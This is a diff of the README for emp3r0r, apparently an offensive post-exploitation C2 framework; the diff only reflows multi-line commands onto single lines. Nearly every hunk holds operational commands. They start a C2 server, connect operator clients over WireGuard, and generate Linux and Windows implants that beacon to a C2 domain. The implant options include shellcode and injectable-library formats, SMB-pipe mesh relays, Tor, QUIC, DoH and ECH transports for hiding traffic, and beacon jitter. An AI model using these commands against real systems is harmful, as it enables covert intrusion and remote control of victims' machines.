@@ -51,8 +51,7 @@ introduces its own fingerprint. Pass `--disable-garble` to build faster, or
 ### Start
 
 ```bash
-emp3r0r server --c2-hosts 1.2.3.4 --http-port 12345 --operator-port 13377 \
-  --operators alice bob carl
+emp3r0r server --c2-hosts 1.2.3.4 --http-port 12345 --operator-port 13377 --operators alice bob carl
 ```
 
 `--operators` names the operators provisioned on the first start. They are
@@ -164,10 +163,7 @@ cd ./emp3r0r-operator-kit && ./install.py
 Connect with the WireGuard credentials the server printed:
 
 ```bash
-emp3r0r client --operator-port 13377 \
-  --server-wg-key '<SERVER_WG_KEY>' --server-wg-ip '<SERVER_WG_IP>' \
-  --operator-wg-ip '<OPERATOR_WG_IP>' --operator-wg-key '<OPERATOR_WG_KEY>' \
-  --c2-host 1.2.3.4
+emp3r0r client --operator-port 13377 --server-wg-key '<SERVER_WG_KEY>' --server-wg-ip '<SERVER_WG_IP>' --operator-wg-ip '<OPERATOR_WG_IP>' --operator-wg-key '<OPERATOR_WG_KEY>' --c2-host 1.2.3.4
 ```
 
 ### Windows (container)
@@ -196,10 +192,7 @@ and exports it to `core/emp3r0r-operator-image.tar.zst`.
    like running it on the host:
 
    ```powershell
-   docker run -it --rm -v emp3r0r-operator:/root/.emp3r0r emp3r0r-operator:latest `
-     emp3r0r client --operator-port 13377 --server-wg-key '<SERVER_WG_KEY>' `
-     --server-wg-ip '<SERVER_WG_IP>' --operator-wg-ip '<OPERATOR_WG_IP>' `
-     --operator-wg-key '<OPERATOR_WG_KEY>' --c2-host 1.2.3.4
+   docker run -it --rm -v emp3r0r-operator:/root/.emp3r0r emp3r0r-operator:latest emp3r0r client --operator-port 13377 --server-wg-key '<SERVER_WG_KEY>' --server-wg-ip '<SERVER_WG_IP>' --operator-wg-ip '<OPERATOR_WG_IP>' --operator-wg-key '<OPERATOR_WG_KEY>' --c2-host 1.2.3.4
    ```
 
 - `-it` is required: the client always starts a tmux session and needs a TTY to
@@ -232,8 +225,7 @@ entirely in userspace.
 needs `CAP_NET_ADMIN` and access to `/dev/net/tun`:
 
 ```powershell
-docker run -it --rm --cap-add NET_ADMIN --device /dev/net/tun `
-  -v emp3r0r-operator:/root/.emp3r0r emp3r0r-operator:latest emp3r0r client ...
+docker run -it --rm --cap-add NET_ADMIN --device /dev/net/tun -v emp3r0r-operator:/root/.emp3r0r emp3r0r-operator:latest emp3r0r client ...
 ```
 
 If Docker Desktop's Linux VM does not expose `/dev/net/tun`, run the operator
@@ -274,18 +266,15 @@ Inside the operator console:
 generate --type linux_executable --arch amd64 --cc your.domain.com
 
 # Mesh gateway agent (also reachable from the C2 directly)
-generate --type linux_executable --arch amd64 --cc your.domain.com \
-  --p2p --direct-c2 --p2p-transport mtls
+generate --type linux_executable --arch amd64 --cc your.domain.com --p2p --direct-c2 --p2p-transport mtls
 
 # Mesh intermediate peer (relays for other agents)
-generate --type linux_executable --arch amd64 --cc your.domain.com \
-  --p2p --p2p-transport mtls --peers 1.2.3.4
+generate --type linux_executable --arch amd64 --cc your.domain.com --p2p --p2p-transport mtls --peers 1.2.3.4
 
 # Windows mesh peer over SMB named pipes (local \\.\pipe, cross-host \\host\pipe),
 # AES-GCM framed like the other transports
 # (requires the Windows SMB stack / logon session to reach the peer)
-generate --type windows_executable --arch amd64 --cc your.domain.com \
-  --p2p --p2p-transport smb
+generate --type windows_executable --arch amd64 --cc your.domain.com --p2p --p2p-transport smb
 ```
 
 Generated payloads use feature-based names instead of timestamps, so the
@@ -313,9 +302,7 @@ generate_c --cc your.domain.com --crypto mbedtls --gzip none
 # libssl (raw TCP + TLS), tor (custom SOCKS5 transport)
 generate_c --cc your.domain.com --transport http_raw
 generate_c --cc your.domain.com --transport libssl
-generate_c --cc abcdefghijklmnop.onion:80 \
-  --c2-channel-mode tor --allow-custom-transport \
-  --transport tor --transport-option socks5=127.0.0.1:9050
+generate_c --cc abcdefghijklmnop.onion:80 --c2-channel-mode tor --allow-custom-transport --transport tor --transport-option socks5=127.0.0.1:9050
 # resolve the C2 host over DNS-over-HTTPS
 generate_c --cc your.domain.com --doh https://1.1.1.1/dns-query
 # musl target (Alpine and other musl hosts); dynload follows the library
@@ -323,8 +310,7 @@ generate_c --type musl --arch arm64 --cc your.domain.com
 # artifact formats: exe (default), so (dlopen/injection), shellcode (malasada PIC)
 generate_c --cc your.domain.com --format so
 # beacon cadence: awake poll window and self-reported offline grace
-generate_c --cc your.domain.com --interval 60 --jitter 50 \
-  --poll-window 5 --offline-grace 0
+generate_c --cc your.domain.com --interval 60 --jitter 50 --poll-window 5 --offline-grace 0
 ```
 
 `--poll-window` is how long the agent waits for queued work after its hello
@@ -447,12 +433,10 @@ UDP-only: it does not use `--proxy`, and it does not ride the P2P mesh.
 
 ```bash
 # Agent that speaks the custom-key QUIC C2 transport
-generate --type linux_executable --arch amd64 --cc c2.example.com \
-  --c2-channel-mode quic
+generate --type linux_executable --arch amd64 --cc c2.example.com --c2-channel-mode quic
 
 # Same, but stock QUIC (HTTP/3-interoperable)
-generate --type linux_executable --arch amd64 --cc c2.example.com \
-  --c2-channel-mode quic --quic-standard-key
+generate --type linux_executable --arch amd64 --cc c2.example.com --c2-channel-mode quic --quic-standard-key
 ```
 
 The C2 is always built with every feature tag, so its QUIC listener is always
@@ -469,8 +453,7 @@ Cloudflare), pass `--doh` and `--ech <c2-domain>` so the agent fetches the
 domain's HTTPS RR and encrypts the inner SNI:
 
 ```bash
-generate --type linux_executable --arch amd64 --cc c2.example.com \
-  --doh https://1.1.1.1/dns-query --ech c2.example.com
+generate --type linux_executable --arch amd64 --cc c2.example.com --doh https://1.1.1.1/dns-query --ech c2.example.com
 ```
 
 `--ech` reads the ECHConfigList from the domain's HTTPS RR, so it requires DoH.
